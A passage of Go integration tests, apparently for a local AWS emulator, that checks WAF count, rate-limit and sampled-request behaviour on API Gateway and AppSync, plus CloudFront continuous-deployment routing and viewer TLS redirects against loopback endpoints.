	url := fmt.Sprintf("http://127.0.0.1:%d/restapis/%s/wafcountstage/_user_request_/wafcount", apiGatewayIntegPort, apiID)

	return r.RunTest(integSvc, "WAF_Enforcement_CountHeaders", func() error {
		// The Count action never blocks, so the request must be served,
		// and the echoed event must carry the inserted header.
		resp, body, err := r.integHTTPSend(http.MethodGet, url, "", map[string]string{
			"User-Agent": "waf-count-probe",
		}, nil)
		if err != nil {
			return fmt.Errorf("invoke: %w", err)
		}
		if resp.StatusCode != http.StatusOK {
			return fmt.Errorf("counted request: expected 200, got %d (body: %s)", resp.StatusCode, body)
		}
		// WAF prefixes inserted header names with x-amzn-waf- (CustomHTTPHeader
		// Name documentation), and Go's header handling canonicalises the name,
		// so the assertion is case-insensitive.
		if !strings.Contains(strings.ToLower(body), "x-amzn-waf-x-waf-count") {
			return fmt.Errorf("echoed Lambda event does not contain the inserted header: %s", body)
		}
		return nil
	})
}

// runWAFEnforcementRateLimit verifies a rate-based block rule on the
// AppSync plane: with a limit of ten, the eleventh request within the
// evaluation window is blocked.
func (r *TestRunner) runWAFEnforcementRateLimit(ic *integClients, ts string) TestResult {
	aclName := fmt.Sprintf("integ-rate-acl-%s", ts)

	aclARN, err := ic.wafCreateACL(aclName, waftypes.ScopeRegional, []waftypes.Rule{{
		Name:     aws.String("RateLimit"),
		Priority: 1,
		Action:   &waftypes.RuleAction{Block: &waftypes.BlockAction{}},
		Statement: &waftypes.Statement{
			RateBasedStatement: &waftypes.RateBasedStatement{
				Limit:            aws.Int64(10),
				AggregateKeyType: waftypes.RateBasedStatementAggregateKeyTypeIp,
			},
		},
		VisibilityConfig: wafACLVisibility("RateLimitRule"),
	}})
	if err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_RateLimit", func() error { return fmt.Errorf("create web acl: %w", err) })
	}
	defer ic.wafDeleteACL(aclName, waftypes.ScopeRegional, aclARN)

	apiResp, err := ic.appsync.CreateGraphqlApi(ic.ctx, &appsync.CreateGraphqlApiInput{
		Name:               aws.String(fmt.Sprintf("integ-rate-gql-%s", ts)),
		AuthenticationType: appsyncTypes.AuthenticationTypeApiKey,
	})
	if err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_RateLimit", func() error { return fmt.Errorf("create graphql api: %w", err) })
	}
	apiID := aws.ToString(apiResp.GraphqlApi.ApiId)
	defer ic.appsync.DeleteGraphqlApi(ic.ctx, &appsync.DeleteGraphqlApiInput{ApiId: aws.String(apiID)})

	keyResp, err := ic.appsync.CreateApiKey(ic.ctx, &appsync.CreateApiKeyInput{ApiId: aws.String(apiID)})
	if err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_RateLimit", func() error { return fmt.Errorf("create api key: %w", err) })
	}
	apiKey := aws.ToString(keyResp.ApiKey.Id)

	if err := ic.appsyncApplySchema(apiID); err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_RateLimit", func() error { return fmt.Errorf("apply schema: %w", err) })
	}

	apiARN := fmt.Sprintf("arn:aws:appsync:%s:%s:apis/%s", ic.region, ic.accountID, apiID)
	if _, err := ic.wafv2.AssociateWebACL(ic.ctx, &wafv2.AssociateWebACLInput{
		WebACLArn: aws.String(aclARN), ResourceArn: aws.String(apiARN),
	}); err != nil {
		return r.RunTest(integSvc, "WAF_Enforcement_RateLimit", func() error { return fmt.Errorf("associate: %w", err) })
	}
	defer ic.wafv2.DisassociateWebACL(ic.ctx, &wafv2.DisassociateWebACLInput{ResourceArn: aws.String(apiARN)})

	graphqlURL := fmt.Sprintf("%s/v1/apis/%s/graphql", r.endpoint, apiID)
	query := []byte(`{"query":"{ __typename }"}`)

	var lastUnderLimit error
	for i := 1; i <= 10; i++ {
		resp, body, err := r.integHTTPSend(http.MethodPost, graphqlURL, "", map[string]string{
			"Content-Type": "application/json",
			"x-api-key":    apiKey,
		}, query)
		if err != nil {
			lastUnderLimit = fmt.Errorf("request %d under the limit: %w", i, err)
			break
		}
		if resp.StatusCode != http.StatusOK {
			lastUnderLimit = fmt.Errorf("request %d under the limit: expected 200, got %d (body: %s)", i, resp.StatusCode, body)
			break
		}
	}

	return r.RunTest(integSvc, "WAF_Enforcement_RateLimit", func() error {
		if lastUnderLimit != nil {
			return lastUnderLimit
		}
		resp, body, err := r.integHTTPSend(http.MethodPost, graphqlURL, "", map[string]string{
			"Content-Type": "application/json",
			"x-api-key":    apiKey,
		}, query)
		if err != nil {
			return fmt.Errorf("request over the limit: %w", err)
		}
		if resp.StatusCode != http.StatusForbidden {
			return fmt.Errorf("request over the limit: expected 403, got %d (body: %s)", resp.StatusCode, body)
		}

		// The aggregation keys the rate statement tracks must now
		// surface through the managed-keys operation, on the family
		// the runner actually connected from.
		keys, err := ic.wafv2.GetRateBasedStatementManagedKeys(ic.ctx, &wafv2.GetRateBasedStatementManagedKeysInput{
			Scope:      waftypes.ScopeRegional,
			WebACLName: aws.String(aclName),
			WebACLId:   aws.String(aclARN[strings.LastIndex(aclARN, "/")+1:]),
			RuleName:   aws.String("RateLimit"),
		})
		if err != nil {
			return fmt.Errorf("managed keys: %w", err)
		}
		want := endpointLoopbackIP(r.endpoint)
		var got []string
		if strings.Contains(want, ":") {
			if keys.ManagedKeysIPV6 != nil {
				got = keys.ManagedKeysIPV6.Addresses
			}
		} else if keys.ManagedKeysIPV4 != nil {
			got = keys.ManagedKeysIPV4.Addresses
		}
		found := false
		for _, addr := range got {
			if addr == want {
				found = true
			}
		}
		if !found {
			return fmt.Errorf("expected %q among the tracked keys, got %v", want, got)
		}
		return nil
	})
}

// runWAFSampledRequests verifies the GetSampledRequests data path end
// to end: enforcement traffic on the AppSync plane is retained and
// retrievable with the rule's metric name inside the three-hour window,
// carrying the full sampled-request shape — the response code sent, the
// applied labels, the inserted headers, the within-group rule name of a
// rule group match and the configured action a rule action override
// replaced.
func (r *TestRunner) runWAFSampledRequests(ic *integClients, ts string) TestResult {
	aclName := fmt.Sprintf("integ-sample-acl-%s", ts)
	rgName := fmt.Sprintf("integ-sample-rg-%s", ts)

	// The referenced rule group's inner rule blocks the same URIs the
	// web ACL's own rule matches; the reference overrides it to Count.
	rgResp, err := ic.wafv2.CreateRuleGroup(ic.ctx, &wafv2.CreateRuleGroupInput{
		Name:             aws.String(rgName),
		Scope:            waftypes.ScopeRegional,
		Capacity:         aws.Int64(10),
		VisibilityConfig: wafACLVisibility(strings.ReplaceAll(rgName, "-", "") + "Metric"),
		Rules: []waftypes.Rule{{
			Name:     aws.String("inner-block"),
			Priority: 1,
			Action:   &waftypes.RuleAction{Block: &waftypes.BlockAction{}},
			Statement: &waftypes.Statement{
				ByteMatchStatement: &waftypes.ByteMatchStatement{
					FieldToMatch:         &waftypes.FieldToMatch{UriPath: &waftypes.UriPath{}},
					PositionalConstraint: waftypes.PositionalConstraintContains,
					SearchString:         []byte("/v1/apis"),
					TextTransformations: []waftypes.TextTransformation{
						{Priority: 0, Type: waftypes.TextTransformationTypeNone},
					},
				},
			},
			VisibilityConfig: &waftypes.VisibilityConfig{
				SampledRequestsEnabled:   true,
				CloudWatchMetricsEnabled: false,
				MetricName:               aws.String("integ-inner-count-metric"),
			},
		}},
	})
	if err != nil {
		return r.RunTest(integSvc, "WAF_SampledRequests", func() error { return fmt.Errorf("create rule group: %w", err) })
	}
	rgID := aws.ToString(rgResp.Summary.Id)
	defer func() {
		get, err := ic.wafv2.GetRuleGroup(ic.ctx, &wafv2.GetRuleGroupInput{
			Name: aws.String(rgName), Scope: waftypes.ScopeRegional, Id: aws.String(rgID),
		})
		if err != nil {
			return
		}
		_, _ = ic.wafv2.DeleteRuleGroup(ic.ctx, &wafv2.DeleteRuleGroupInput{
			Name: aws.String(rgName), Scope: waftypes.ScopeRegional, Id: aws.String(rgID),
			LockToken: get.LockToken,
		})
	}()

	aclARN, err := ic.wafCreateACL(aclName, waftypes.ScopeRegional, []waftypes.Rule{
		{
			Name:           aws.String("UseGroup"),
			Priority:       0,
			OverrideAction: &waftypes.OverrideAction{},
			Statement: &waftypes.Statement{
				RuleGroupReferenceStatement: &waftypes.RuleGroupReferenceStatement{
					ARN: rgResp.Summary.ARN,
					RuleActionOverrides: []waftypes.RuleActionOverride{{
						Name:        aws.String("inner-block"),
						ActionToUse: &waftypes.RuleAction{Count: &waftypes.CountAction{}},
					}},
				},
			},
			VisibilityConfig: &waftypes.VisibilityConfig{
				SampledRequestsEnabled:   true,
				CloudWatchMetricsEnabled: false,
				MetricName:               aws.String("use-group-metric"),
			},
		},
		{
			Name:     aws.String("CountProbe"),
			Priority: 1,
			Action: &waftypes.RuleAction{Count: &waftypes.CountAction{
				CustomRequestHandling: &waftypes.CustomRequestHandling{
					InsertHeaders: []waftypes.CustomHTTPHeader{{
						Name:  aws.String("integ-inserted"),
						Value: aws.String("sampled"),
					}},
				},
			}},
			Statement: &waftypes.Statement{
				ByteMatchStatement: &waftypes.ByteMatchStatement{
					FieldToMatch:         &waftypes.FieldToMatch{UriPath: &waftypes.UriPath{}},
					PositionalConstraint: waftypes.PositionalConstraintContains,
					SearchString:         []byte("/v1/apis"),
					TextTransformations: []waftypes.TextTransformation{
						{Priority: 0, Type: waftypes.TextTransformationTypeNone},
					},
				},
			},
			VisibilityConfig: &waftypes.VisibilityConfig{
				SampledRequestsEnabled:   true,
				CloudWatchMetricsEnabled: false,
				MetricName:               aws.String("count-probe-metric"),
			},
		},
		{
			Name:       aws.String("BlockGraphQL"),
			Priority:   2,
			Action:     &waftypes.RuleAction{Block: &waftypes.BlockAction{}},
			RuleLabels: []waftypes.Label{{Name: aws.String("blocked-graphql")}},
			Statement: &waftypes.Statement{
				ByteMatchStatement: &waftypes.ByteMatchStatement{
					FieldToMatch:         &waftypes.FieldToMatch{UriPath: &waftypes.UriPath{}},
					PositionalConstraint: waftypes.PositionalConstraintContains,
					SearchString:         []byte("/v1/apis"),
					TextTransformations: []waftypes.TextTransformation{
						{Priority: 0, Type: waftypes.TextTransformationTypeNone},
					},
				},
			},
			VisibilityConfig: &waftypes.VisibilityConfig{
				SampledRequestsEnabled:   true,
				CloudWatchMetricsEnabled: false,
				MetricName:               aws.String("block-graphql-metric"),
			},
		},
	})
	if err != nil {
		return r.RunTest(integSvc, "WAF_SampledRequests", func() error { return fmt.Errorf("create web acl: %w", err) })
	}
	defer ic.wafDeleteACL(aclName, waftypes.ScopeRegional, aclARN)

	apiResp, err := ic.appsync.CreateGraphqlApi(ic.ctx, &appsync.CreateGraphqlApiInput{
		Name:               aws.String(fmt.Sprintf("integ-sample-gql-%s", ts)),
		AuthenticationType: appsyncTypes.AuthenticationTypeApiKey,
	})
	if err != nil {
		return r.RunTest(integSvc, "WAF_SampledRequests", func() error { return fmt.Errorf("create graphql api: %w", err) })
	}
	apiID := aws.ToString(apiResp.GraphqlApi.ApiId)
	defer ic.appsync.DeleteGraphqlApi(ic.ctx, &appsync.DeleteGraphqlApiInput{ApiId: aws.String(apiID)})

	keyResp, err := ic.appsync.CreateApiKey(ic.ctx, &appsync.CreateApiKeyInput{ApiId: aws.String(apiID)})
	if err != nil {
		return r.RunTest(integSvc, "WAF_SampledRequests", func() error { return fmt.Errorf("create api key: %w", err) })
	}
	apiKey := aws.ToString(keyResp.ApiKey.Id)

	if err := ic.appsyncApplySchema(apiID); err != nil {
		return r.RunTest(integSvc, "WAF_SampledRequests", func() error { return fmt.Errorf("apply schema: %w", err) })
	}

	apiARN := fmt.Sprintf("arn:aws:appsync:%s:%s:apis/%s", ic.region, ic.accountID, apiID)
	if _, err := ic.wafv2.AssociateWebACL(ic.ctx, &wafv2.AssociateWebACLInput{
		WebACLArn: aws.String(aclARN), ResourceArn: aws.String(apiARN),
	}); err != nil {
		return r.RunTest(integSvc, "WAF_SampledRequests", func() error { return fmt.Errorf("associate: %w", err) })
	}
	defer ic.wafv2.DisassociateWebACL(ic.ctx, &wafv2.DisassociateWebACLInput{ResourceArn: aws.String(apiARN)})

	graphqlURL := fmt.Sprintf("%s/v1/apis/%s/graphql", r.endpoint, apiID)
	query := []byte(`{"query":"{ __typename }"}`)
	for i := 0; i < 2; i++ {
		resp, _, err := r.integHTTPSend(http.MethodPost, graphqlURL, "", map[string]string{
			"Content-Type": "application/json",
			"x-api-key":    apiKey,
		}, query)
		if err != nil {
			return r.RunTest(integSvc, "WAF_SampledRequests", func() error { return fmt.Errorf("blocked request %d: %w", i, err) })
		}
		if resp.StatusCode != http.StatusForbidden {
			return r.RunTest(integSvc, "WAF_SampledRequests", func() error {
				return fmt.Errorf("blocked request %d: expected 403, got %d", i, resp.StatusCode)
			})
		}
	}

	return r.RunTest(integSvc, "WAF_SampledRequests", func() error {
		now := time.Now()
		samples, err := ic.wafv2.GetSampledRequests(ic.ctx, &wafv2.GetSampledRequestsInput{
			WebAclArn:      aws.String(aclARN),
			RuleMetricName: aws.String("block-graphql-metric"),
			Scope:          waftypes.ScopeRegional,
			TimeWindow: &waftypes.TimeWindow{
				StartTime: aws.Time(now.Add(-time.Hour)),
				EndTime:   aws.Time(now.Add(time.Minute)),
			},
			MaxItems: aws.Int64(100),
		})
		if err != nil {
			return err
		}
		if len(samples.SampledRequests) < 2 {
			return fmt.Errorf("expected at least 2 sampled requests, got %d", len(samples.SampledRequests))
		}
		if samples.PopulationSize < 2 {
			return fmt.Errorf("expected PopulationSize >= 2, got %d", samples.PopulationSize)
		}
		first := samples.SampledRequests[0]
		if aws.ToString(first.Action) != "BLOCK" {
			return fmt.Errorf("expected BLOCK action, got %q", aws.ToString(first.Action))
		}
		if first.Request == nil || !strings.HasPrefix(aws.ToString(first.Request.URI), "/v1/apis") {
			return fmt.Errorf("expected the GraphQL URI in the sampled request, got %+v", first.Request)
		}
		if aws.ToString(first.Request.Method) != http.MethodPost {
			return fmt.Errorf("expected POST method, got %q", aws.ToString(first.Request.Method))
		}
		if aws.ToString(first.Request.ClientIP) != endpointLoopbackIP(r.endpoint) {
			return fmt.Errorf("expected the client address %q, got %q", endpointLoopbackIP(r.endpoint), aws.ToString(first.Request.ClientIP))
		}
		if aws.ToInt32(first.ResponseCodeSent) != http.StatusForbidden {
			return fmt.Errorf("expected ResponseCodeSent 403, got %d", aws.ToInt32(first.ResponseCodeSent))
		}
		if first.RuleNameWithinRuleGroup != nil {
			return fmt.Errorf("expected no RuleNameWithinRuleGroup for a rule declared in the web ACL, got %q", aws.ToString(first.RuleNameWithinRuleGroup))
		}
		labelFound := false
		for _, label := range first.Labels {
			name := aws.ToString(label.Name)
			if strings.HasPrefix(name, "awswaf:") && strings.HasSuffix(name, "blocked-graphql") {
				labelFound = true
			}
		}
		if !labelFound {
			return fmt.Errorf("expected the qualified blocked-graphql label among %+v", first.Labels)
		}
		insertFound := false
		for _, header := range first.RequestHeadersInserted {
			if strings.HasSuffix(aws.ToString(header.Name), "integ-inserted") && aws.ToString(header.Value) == "sampled" {
				insertFound = true
			}
		}
		if !insertFound {
			return fmt.Errorf("expected the count rule's inserted header among %+v", first.RequestHeadersInserted)
		}

		// The rule group's inner rule was overridden to Count: its own
		// samples carry the applied Count, the configured Block it
		// replaced and the within-group rule name.
		inner, err := ic.wafv2.GetSampledRequests(ic.ctx, &wafv2.GetSampledRequestsInput{
			WebAclArn:      aws.String(aclARN),
			RuleMetricName: aws.String("integ-inner-count-metric"),
			Scope:          waftypes.ScopeRegional,
			TimeWindow: &waftypes.TimeWindow{
				StartTime: aws.Time(now.Add(-time.Hour)),
				EndTime:   aws.Time(now.Add(time.Minute)),
			},
			MaxItems: aws.Int64(100),
		})
		if err != nil {
			return err
		}
		if len(inner.SampledRequests) < 2 {
			return fmt.Errorf("expected at least 2 sampled requests of the overridden inner rule, got %d", len(inner.SampledRequests))
		}
		innerFirst := inner.SampledRequests[0]
		if aws.ToString(innerFirst.Action) != "COUNT" {
			return fmt.Errorf("expected the override's COUNT action, got %q", aws.ToString(innerFirst.Action))
		}
		if aws.ToString(innerFirst.OverriddenAction) != "BLOCK" {
			return fmt.Errorf("expected the configured BLOCK as OverriddenAction, got %q", aws.ToString(innerFirst.OverriddenAction))
		}
		if aws.ToString(innerFirst.RuleNameWithinRuleGroup) != rgName+"#inner-block" {
			return fmt.Errorf("expected the within-group name %q, got %q", rgName+"#inner-block", aws.ToString(innerFirst.RuleNameWithinRuleGroup))
		}
		return nil
	})
}

// runCloudFrontContinuousDeployment exercises the live continuous
// deployment routing: the staging copy's origin points at a dead port,
// so requests routed to it surface as 502 while primary-routed requests
// succeed, making the header-based split observable end to end.
func (r *TestRunner) runCloudFrontContinuousDeployment(ic *integClients, ts string) TestResult {
	distName := fmt.Sprintf("integ-cdp-dist-%s", ts)

	distConfig := func(originDomain string, port int32) *cftypes.DistributionConfig {
		return &cftypes.DistributionConfig{
			CallerReference: aws.String(distName),
			Enabled:         aws.Bool(true),
			Comment:         aws.String("Continuous deployment integration test"),
			Origins: &cftypes.Origins{
				Quantity: aws.Int32(1),
				Items: []cftypes.Origin{{
					Id:         aws.String("integ-origin"),
					DomainName: aws.String(originDomain),
					CustomOriginConfig: &cftypes.CustomOriginConfig{
						HTTPPort:             aws.Int32(port),
						HTTPSPort:            aws.Int32(50443),
						OriginProtocolPolicy: cftypes.OriginProtocolPolicyHttpOnly,
						OriginReadTimeout:    aws.Int32(30),
						OriginSslProtocols: &cftypes.OriginSslProtocols{
							Quantity: aws.Int32(1),
							Items:    []cftypes.SslProtocol{cftypes.SslProtocolTLSv12},
						},
					},
				}},
			},
			DefaultCacheBehavior: &cftypes.DefaultCacheBehavior{
				TargetOriginId:       aws.String("integ-origin"),
				ViewerProtocolPolicy: cftypes.ViewerProtocolPolicyAllowAll,
				AllowedMethods: &cftypes.AllowedMethods{
					Quantity: aws.Int32(2),
					Items:    []cftypes.Method{cftypes.MethodHead, cftypes.MethodGet},
				},
				ForwardedValues: &cftypes.ForwardedValues{
					QueryString: aws.Bool(false),
					Cookies:     &cftypes.CookiePreference{Forward: cftypes.ItemSelectionNone},
				},
				MinTTL:     aws.Int64(0),
				DefaultTTL: aws.Int64(0),
				MaxTTL:     aws.Int64(0),
			},
			ViewerCertificate: &cftypes.ViewerCertificate{
				CloudFrontDefaultCertificate: aws.Bool(true),
			},
			Restrictions: &cftypes.Restrictions{
				GeoRestriction: &cftypes.GeoRestriction{
					RestrictionType: cftypes.GeoRestrictionTypeNone,
					Quantity:        aws.Int32(0),
				},
			},
		}
	}

	distResp, err := ic.cloudfront.CreateDistribution(ic.ctx, &cloudfront.CreateDistributionInput{
		DistributionConfig: distConfig("127.0.0.1:50080", 50080),
	})
	if err != nil {
		return r.RunTest(integSvc, "CloudFront_ContinuousDeployment", func() error {
			return fmt.Errorf("create distribution: %w", err)
		})
	}
	distID := aws.ToString(distResp.Distribution.Id)
	primaryETag := aws.ToString(distResp.ETag)
	primaryDomain := aws.ToString(distResp.Distribution.DomainName)

	copyResp, err := ic.cloudfront.CopyDistribution(ic.ctx, &cloudfront.CopyDistributionInput{
		PrimaryDistributionId: aws.String(distID),
		CallerReference:       aws.String(distName + "-staging"),
		Staging:               aws.Bool(true),
	})
	if err != nil {
		return r.RunTest(integSvc, "CloudFront_ContinuousDeployment", func() error {
			return fmt.Errorf("copy distribution: %w", err)
		})
	}
	stagingID := aws.ToString(copyResp.Distribution.Id)
	stagingETag := aws.ToString(copyResp.ETag)
	stagingDomain := aws.ToString(copyResp.Distribution.DomainName)

	cleanupDistribution := func(id, etag string) {
		if cfgResp, err := ic.cloudfront.GetDistributionConfig(ic.ctx, &cloudfront.GetDistributionConfigInput{Id: aws.String(id)}); err == nil {
			cfgResp.DistributionConfig.Enabled = aws.Bool(false)
			if upd, err := ic.cloudfront.UpdateDistribution(ic.ctx, &cloudfront.UpdateDistributionInput{
				Id: aws.String(id), IfMatch: cfgResp.ETag, DistributionConfig: cfgResp.DistributionConfig,
			}); err == nil && upd.ETag != nil {
				etag = *upd.ETag
			}
		}
		_, _ = ic.cloudfront.DeleteDistribution(ic.ctx, &cloudfront.DeleteDistributionInput{
			Id: aws.String(id), IfMatch: aws.String(etag),
		})
	}
	defer cleanupDistribution(stagingID, stagingETag)
	defer cleanupDistribution(distID, primaryETag)

	var policyID string
	return r.RunTest(integSvc, "CloudFront_ContinuousDeployment", func() error {
		// Point the staging copy at a dead port so routed requests
		// surface as 502 from the distribution layer.
		stagingCfg, err := ic.cloudfront.GetDistributionConfig(ic.ctx, &cloudfront.GetDistributionConfigInput{Id: aws.String(stagingID)})
		if err != nil {
			return err
		}
		stagingCfg.DistributionConfig.Origins.Items[0].DomainName = aws.String("127.0.0.1:1")
		stagingCfg.DistributionConfig.Origins.Items[0].CustomOriginConfig.HTTPPort = aws.Int32(1)
		if _, err := ic.cloudfront.UpdateDistribution(ic.ctx, &cloudfront.UpdateDistributionInput{
			Id: aws.String(stagingID), IfMatch: stagingCfg.ETag, DistributionConfig: stagingCfg.DistributionConfig,
		}); err != nil {
			return fmt.Errorf("repoint staging origin: %w", err)
		}

		policyResp, err := ic.cloudfront.CreateContinuousDeploymentPolicy(ic.ctx, &cloudfront.CreateContinuousDeploymentPolicyInput{
			ContinuousDeploymentPolicyConfig: &cftypes.ContinuousDeploymentPolicyConfig{
				StagingDistributionDnsNames: &cftypes.StagingDistributionDnsNames{
					Quantity: aws.Int32(1),
					Items:    []string{stagingDomain},
				},
				Enabled: aws.Bool(true),
				TrafficConfig: &cftypes.TrafficConfig{
					Type: cftypes.ContinuousDeploymentPolicyTypeSingleHeader,
					SingleHeaderConfig: &cftypes.ContinuousDeploymentSingleHeaderConfig{
						Header: aws.String("aws-cf-cd-integ"),
						Value:  aws.String("staging"),
					},
				},
			},
		})
		if err != nil {
			return fmt.Errorf("create policy: %w", err)
		}
		policyID = aws.ToString(policyResp.ContinuousDeploymentPolicy.Id)
		defer func() {
			// Detach before the deferred distribution cleanups run.
			if cfgResp, err := ic.cloudfront.GetDistributionConfig(ic.ctx, &cloudfront.GetDistributionConfigInput{Id: aws.String(distID)}); err == nil {
				cfgResp.DistributionConfig.ContinuousDeploymentPolicyId = aws.String("")
				if _, err := ic.cloudfront.UpdateDistribution(ic.ctx, &cloudfront.UpdateDistributionInput{
					Id: aws.String(distID), IfMatch: cfgResp.ETag, DistributionConfig: cfgResp.DistributionConfig,
				}); err == nil {
					_, _ = ic.cloudfront.DeleteContinuousDeploymentPolicy(ic.ctx, &cloudfront.DeleteContinuousDeploymentPolicyInput{
						Id: aws.String(policyID), IfMatch: policyResp.ETag,
					})
				}
			}
		}()

		primaryCfg, err := ic.cloudfront.GetDistributionConfig(ic.ctx, &cloudfront.GetDistributionConfigInput{Id: aws.String(distID)})
		if err != nil {
			return err
		}
		primaryCfg.DistributionConfig.ContinuousDeploymentPolicyId = aws.String(policyID)
		if _, err := ic.cloudfront.UpdateDistribution(ic.ctx, &cloudfront.UpdateDistributionInput{
			Id: aws.String(distID), IfMatch: primaryCfg.ETag, DistributionConfig: primaryCfg.DistributionConfig,
		}); err != nil {
			return fmt.Errorf("attach policy: %w", err)
		}

		base := fmt.Sprintf("http://127.0.0.1:%d", cloudFrontIntegPort)

		// A plain request stays on the primary and reaches the origin.
		resp, body, err := r.integHTTPSend(http.MethodGet, base+"/.well-known/health", primaryDomain, nil, nil)
		if err != nil {
			return fmt.Errorf("primary-routed request: %w", err)
		}
		if resp.StatusCode != http.StatusOK {
			return fmt.Errorf("primary-routed request: expected 200, got %d (body: %s)", resp.StatusCode, body)
		}

		// A request with the routing header lands on the staging copy
		// whose origin is dead, so the distribution answers 502.
		resp, body, err = r.integHTTPSend(http.MethodGet, base+"/.well-known/health", primaryDomain,
			map[string]string{"aws-cf-cd-integ": "staging"}, nil)
		if err != nil {
			return fmt.Errorf("staging-routed request: %w", err)
		}
		if resp.StatusCode != http.StatusBadGateway {
			return fmt.Errorf("staging-routed request: expected 502, got %d (body: %s)", resp.StatusCode, body)
		}

		// Viewers cannot reach the staging distribution directly.
		resp, body, err = r.integHTTPSend(http.MethodGet, base+"/.well-known/health", stagingDomain, nil, nil)
		if err != nil {
			return fmt.Errorf("direct staging request: %w", err)
		}
		if resp.StatusCode != http.StatusForbidden {
			return fmt.Errorf("direct staging request: expected 403, got %d (body: %s)", resp.StatusCode, body)
		}
		return nil
	})
}

// runCloudFrontViewerTLS exercises the distribution TLS plane and the
// viewer protocol policy end to end: an alias distribution with an
// attached ACM certificate serves that certificate over SNI on the TLS
// port, redirect-to-https answers plain HTTP with 301 pointing at the TLS
// plane, and https-only refuses plain HTTP with 403.
func (r *TestRunner) runCloudFrontViewerTLS(ic *integClients, ts string) TestResult {
	distName := fmt.Sprintf("integ-viewer-tls-%s", ts)
	alias := fmt.Sprintf("%s.example.com", distName)

	certResp, err := ic.acm.RequestCertificate(ic.ctx, &acm.RequestCertificateInput{
		DomainName:       aws.String(alias),
		ValidationMethod: acmtypes.ValidationMethodDns,
	})
	if err != nil {
		return r.RunTest(integSvc, "CloudFront_ViewerTLS", func() error {
			return fmt.Errorf("request certificate: %w", err)
		})
	}
	certArn := aws.ToString(certResp.CertificateArn)
	defer func() {
		_, _ = ic.acm.DeleteCertificate(ic.ctx, &acm.DeleteCertificateInput{CertificateArn: aws.String(certArn)})
	}()

	distResp, err := ic.cloudfront.CreateDistribution(ic.ctx, &cloudfront.CreateDistributionInput{
		DistributionConfig: &cftypes.DistributionConfig{
			CallerReference: aws.String(distName),
			Enabled:         aws.Bool(true),
			Comment:         aws.String("Viewer TLS integration test"),
			Aliases:         &cftypes.Aliases{Quantity: aws.Int32(1), Items: []string{alias}},
			Origins: &cftypes.Origins{
				Quantity: aws.Int32(1),
				Items: []cftypes.Origin{{
					Id:         aws.String("integ-origin"),
					DomainName: aws.String("127.0.0.1:50080"),
					CustomOriginConfig: &cftypes.CustomOriginConfig{
						HTTPPort:             aws.Int32(50080),
						HTTPSPort:            aws.Int32(50443),
						OriginProtocolPolicy: cftypes.OriginProtocolPolicyHttpOnly,
						OriginReadTimeout:    aws.Int32(30),
					},
				}},
			},
			DefaultCacheBehavior: &cftypes.DefaultCacheBehavior{
				TargetOriginId:       aws.String("integ-origin"),
				ViewerProtocolPolicy: cftypes.ViewerProtocolPolicyRedirectToHttps,
				AllowedMethods: &cftypes.AllowedMethods{
					Quantity: aws.Int32(2),
					Items:    []cftypes.Method{cftypes.MethodHead, cftypes.MethodGet},
				},
				ForwardedValues: &cftypes.ForwardedValues{
					QueryString: aws.Bool(false),
					Cookies:     &cftypes.CookiePreference{Forward: cftypes.ItemSelectionNone},
				},
				MinTTL:     aws.Int64(0),
				DefaultTTL: aws.Int64(0),
				MaxTTL:     aws.Int64(0),
			},
			ViewerCertificate: &cftypes.ViewerCertificate{
				ACMCertificateArn:      aws.String(certArn),
				SSLSupportMethod:       cftypes.SSLSupportMethodSniOnly,
				MinimumProtocolVersion: cftypes.MinimumProtocolVersionTLSv122021,
			},
			Restrictions: &cftypes.Restrictions{
				GeoRestriction: &cftypes.GeoRestriction{
					RestrictionType: cftypes.GeoRestrictionTypeNone,
					Quantity:        aws.Int32(0),
				},
			},
		},
	})
	if err != nil {
		return r.RunTest(integSvc, "CloudFront_ViewerTLS", func() error {
			return fmt.Errorf("create distribution: %w", err)
		})
	}
	distID := aws.ToString(distResp.Distribution.Id)
	etag := aws.ToString(distResp.ETag)
	defer func() {
		if cfgResp, err := ic.cloudfront.GetDistributionConfig(ic.ctx, &cloudfront.GetDistributionConfigInput{Id: aws.String(distID)}); err == nil {
			cfgResp.DistributionConfig.Enabled = aws.Bool(false)
			if upd, err := ic.cloudfront.UpdateDistribution(ic.ctx, &cloudfront.UpdateDistributionInput{
				Id: aws.String(distID), IfMatch: cfgResp.ETag, DistributionConfig: cfgResp.DistributionConfig,
			}); err == nil && upd.ETag != nil {
				etag = *upd.ETag
			}
		}
		_, _ = ic.cloudfront.DeleteDistribution(ic.ctx, &cloudfront.DeleteDistributionInput{
			Id: aws.String(distID), IfMatch: aws.String(etag),
		})
	}()

	// plainHTTPSend issues a plain-HTTP request that does NOT follow the
	// redirect: the runner's shared client would chase the 301 into the
	// https Location and fail resolving the alias, defeating the assert.
	plainHTTPSend := func(path string) (*http.Response, string, error) {
		req, err := http.NewRequest(http.MethodGet, fmt.Sprintf("http://127.0.0.1:%d%s", cloudFrontIntegPort, path), nil)
		if err != nil {
			return nil, "", err
		}
		req.Host = alias
		client := &http.Client{
			Timeout: 10 * time.Second,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		}
		resp, err := client.Do(req)
		if err != nil {
			return nil, "", err
		}
		defer resp.Body.Close()
		respBody, err := io.ReadAll(resp.Body)
		if err != nil {
			return resp, "", fmt.Errorf("read response body: %w", err)
		}
		return resp, string(respBody), nil
	}

	return r.RunTest(integSvc, "CloudFront_ViewerTLS", func() error {
		// redirect-to-https answers plain HTTP with 301 to the TLS plane.
		resp, body, err := plainHTTPSend("/.well-known/health?probe=1")
		if err != nil {
			return fmt.Errorf("plain-HTTP request: %w", err)
		}
		if resp.StatusCode != http.StatusMovedPermanently {
			return fmt.Errorf("plain-HTTP request: expected 301, got %d (body: %s)", resp.StatusCode, body)
		}
		wantLocation := fmt.Sprintf("https://%s:%d/.well-known/health?probe=1", alias, cloudFrontTLSIntegPort)
		if got := resp.Header.Get("Location"); got != wantLocation {
			return fmt.Errorf("redirect Location = %q, want %q", got, wantLocation)
		}

		// The TLS plane serves the attached ACM certificate for the alias
		// and proxies to the origin.
		tlsClient := &http.Client{
			Timeout: 10 * time.Second,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true,
					ServerName:         alias,
				},
			},
		}
		// The URL addresses the loopback listener directly (the alias has
